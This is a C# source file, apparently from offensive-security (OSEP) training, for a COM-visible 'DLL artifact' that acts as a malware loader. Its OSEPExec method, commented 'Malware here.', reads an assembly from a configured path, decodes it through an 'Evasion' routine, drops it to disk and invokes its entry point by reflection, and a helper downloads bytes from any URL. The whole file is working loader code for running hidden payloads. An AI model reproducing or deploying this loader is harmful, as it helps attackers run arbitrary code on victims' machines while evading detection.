using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    [ComVisible(true)]
    public class OSEPRunner
    {

        public static void OSEPExec()
        {
            //Malware here.
            Debug.RunDebug("DLL Artifact DLL Execute Assembly OSEPExec() has started...");


            RunAssembly(CONFIG.EA_STATIC_PATH, CONFIG.EA_STATIC_ARGS).GetAwaiter().GetResult();



        }

        private static async Task<int> RunAssembly(string assemblyPath, params string[] args)
        {
            Debug.RunDebug("Loading assembly...");

            Assembly asm;

            if (CONFIG.EA_ASSEMBLY_IS_ENCODED)
            {
                byte[] ebytes = File.ReadAllBytes(assemblyPath);
                File.WriteAllBytes(CONFIG.EA_ASSEMBLY_WRITE_LOCATION, Evasion.Decode(ebytes));
                asm = Assembly.LoadFrom(CONFIG.EA_ASSEMBLY_WRITE_LOCATION);
            }
            else
            {
                asm = Assembly.LoadFrom(assemblyPath);
            }



            MethodInfo entry = asm.EntryPoint;
            ParameterInfo[] entryParams = entry.GetParameters();

            object[] parameters;

            if (entryParams.Length == 0)
            {
                parameters = new object[0];
            }
            else if (entryParams.Length == 1)
            {
                parameters = new object[] { args };
            }
            else
            {
                throw new InvalidOperationException("Unsupported entry point signature.");
            }



            try
            {
                Debug.RunDebug("Invoking assembly...");
                object result = entry.Invoke(null, parameters);

                Task task = result as Task;
                if (task != null)
                {
                    await task;

                    // Handles Task<int>
                    Type taskType = task.GetType();
                    if (taskType.IsGenericType && taskType.GetGenericTypeDefinition() == typeof(Task<>))
                    {
                        PropertyInfo resultProperty = taskType.GetProperty("Result");
                        object taskResult = resultProperty.GetValue(task, null);

                        if (taskResult is int)
                            return (int)taskResult;
                    }

                    return 0;
                }

                if (result is int)
                    return (int)result;
            }
            catch
            {
                Debug.RunDebug("Error invoking assembly...");
            }




            Debug.RunDebug("Done...\n\n");
            return 0;
        }

        public static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (var client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }

    }
}
